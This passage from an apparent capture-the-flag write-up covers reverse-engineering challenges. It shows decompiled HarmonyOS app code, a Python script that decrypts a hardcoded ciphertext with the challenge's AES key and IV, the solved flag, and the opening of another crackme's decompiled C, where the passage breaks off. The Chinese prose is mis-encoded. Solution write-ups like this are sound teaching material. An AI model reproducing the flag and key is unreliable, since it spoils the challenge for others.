</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">console</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Native</span><span class="w"> </span><span class="n">encryption</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="err">&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">r5</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Error</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Native</span><span class="w"> </span><span class="n">encryption</span><span class="w"> </span><span class="n">call</span><span class="w"> </span><span class="n">failed</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">r5</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">$err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">r0</span><span class="p">.</span><span class="na">$reject</span><span class="p">(</span><span class="n">$err</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">r23</span><span class="p">.</span><span class="na">rerender</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">rerender</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="na">updateDirtyElements</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">r22</span><span class="p">.</span><span class="na">getEntryName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">getEntryName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="err">&#39;</span><span class="n">CheckPassword</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">x_1_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r22</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">const</span><span class="w"> </span><span class="n">r57</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">registerNamedRoute</span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">x_1_1</span><span class="p">(</span><span class="n">undefined</span><span class="p">,</span><span class="w"> </span><span class="p">{});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">},</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">bundleName</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">rev</span><span class="p">.</span><span class="na">astpr</span><span class="p">.</span><span class="na">aneasysystem</span><span class="err">&#39;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">moduleName</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">entry</span><span class="err">&#39;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">pagePath</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">pages</span><span class="err">\</span><span class="o">/</span><span class="n">Index</span><span class="err">&#39;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">pageFullPath</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">entry</span><span class="err">\</span><span class="o">/</span><span class="n">src</span><span class="err">\</span><span class="o">/</span><span class="n">main</span><span class="err">\</span><span class="o">/</span><span class="n">ets</span><span class="err">\</span><span class="o">/</span><span class="n">pages</span><span class="err">\</span><span class="o">/</span><span class="n">Index</span><span class="err">&#39;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">integratedHsp</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="kc">false</span><span class="err">&#39;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">moduleType</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">followWithHap</span><span class="err">&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">});</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>åŠ å¯†è¿‡ç¨‹æ¸…æ™°å†™å‡ºè§£å¯†è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># decrypt_flag.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Usage: python decrypt_flag.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Requires: pip install pycryptodome</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ä½ æä¾›çš„ Base58 å­—æ¯è¡¨ï¼ˆoff_1C960ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">B58_ALPHABET</span> <span class="o">=</span> <span class="s2">&#34;rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># é»˜è®¤ targetCipherï¼ˆå¦‚æœä½ è¦è§£åˆ«çš„å­—ç¬¦ä¸²å¯ä»¥ä¿®æ”¹è¿™é‡Œæˆ–é€šè¿‡å‘½ä»¤è¡Œä¼ å…¥ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&#34;yaApcJ5GoyGwhARDXZLQUdntqPpmVu2GuTChnsLoj5d8ABinwGSsgpGaiPWYbHTTbbzSXxLXwoLgjR1YgquyEnK&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">KEY</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;welcometosyc2025&#34;</span>      <span class="c1"># 16 bytes</span>
</span></span><span class="line"><span class="cl"><span class="n">IV</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;helloimsamsarami&#34;</span>      <span class="c1"># first 16 bytes of &#34;helloimsamsaramiao&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">b58decode_custom</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Decode a base58 string using a custom alphabet into raw bytes.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">base</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="o">=</span> <span class="p">{</span><span class="n">ch</span><span class="p">:</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ch</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">index</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Invalid character </span><span class="si">{</span><span class="n">ch</span><span class="si">!r}</span><span class="s2"> for provided alphabet&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">num</span> <span class="o">=</span> <span class="n">num</span> <span class="o">*</span> <span class="n">base</span> <span class="o">+</span> <span class="n">index</span><span class="p">[</span><span class="n">ch</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># convert integer to bytes</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">blen</span> <span class="o">=</span> <span class="p">(</span><span class="n">num</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="n">num</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">blen</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># leading &#39;zero&#39; chars in base58 correspond to leading zero bytes</span>
</span></span><span class="line"><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="n">alphabet</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pad</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">b</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_target</span><span class="p">(</span><span class="n">target</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 1) base58 decode with custom alphabet</span>
</span></span><span class="line"><span class="cl">    <span class="n">raw</span> <span class="o">=</span> <span class="n">b58decode_custom</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">B58_ALPHABET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] base58 decoded length = </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 2) interpret as ASCII hex string and hex-decode</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">hex_str</span> <span class="o">=</span> <span class="n">raw</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Decoded base58 bytes are not valid ASCII: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># debug</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;hex_str sample:&#34;, hex_str[:64])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="s2">&#34;0123456789abcdefABCDEF&#34;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">hex_str</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Decoded base58 contents do not look like an even-length hex string&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">cipher_bytes</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] hex -&gt; ciphertext length = </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 3) AES-128-CBC decrypt</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">IV</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 4) try PKCS#7 unpad (most likely)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pt</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">decrypted</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœ PKCS7 å»ä¸æ‰ï¼Œå¯ä»¥å°è¯•å» 0 å¡«å……ä½œä¸ºå¤‡ç”¨ï¼ˆè¿™é‡Œæˆ‘ä»¬å…ˆæŠ¥é”™ä»¥æç¤ºï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;PKCS#7 unpad failed. Decrypted raw bytes (hex):</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                           <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># è¾“å‡ºç»“æœ</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">printable</span> <span class="o">=</span> <span class="n">pt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">printable</span> <span class="o">=</span> <span class="nb">repr</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">printable</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="n">decrypt_target</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] Decrypted plaintext:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Error:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;If you want, you can change TARGET to another cipher or pass it in.&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œç»“æœSYC{HarmonyOS_1s_right?right!}</p>
<h3 id="14lastone">14.Lastone
</h3><p>å…ˆé€šè¿‡stringè¡¨æ‰¾åˆ°ä¸»ä½“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_403A80</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">FILE</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp-8h] [ebp-150h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-148h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-148h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-148h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [esp+10h] [ebp-138h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+DCh] [ebp-6Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v10</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [esp+E8h] [ebp-60h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v11</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span> <span class="c1">// [esp+EBh] [ebp-5Dh] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v12</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [esp+F6h] [ebp-52h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v13</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [esp+106h] [ebp-42h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">Buffer</span><span class="p">[</span><span class="mi">44</span><span class="p">];</span> <span class="c1">// [esp+110h] [ebp-38h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">BOOL</span> <span class="n">Wow64Process</span><span class="p">;</span> <span class="c1">// [esp+13Ch] [ebp-Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">savedregs</span><span class="p">;</span> <span class="c1">// [esp+148h] [ebp+0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_40125D</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_40E0A3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">Wow64Process</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">GetCurrentProcess</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="nf">sub_401186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IsWow64Process</span><span class="p">(</span><span class="n">v0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Wow64Process</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">sub_401186</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="n">Wow64Process</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub_401091</span><span class="p">(</span><span class="s">&#34;[+] Input your flag: &#34;</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__acrt_iob_func</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="nf">sub_401186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">sub_401186</span><span class="p">()</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">strcspn</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v8</span> <span class="o">=</span> <span class="nf">sub_401186</span><span class="p">();</span>
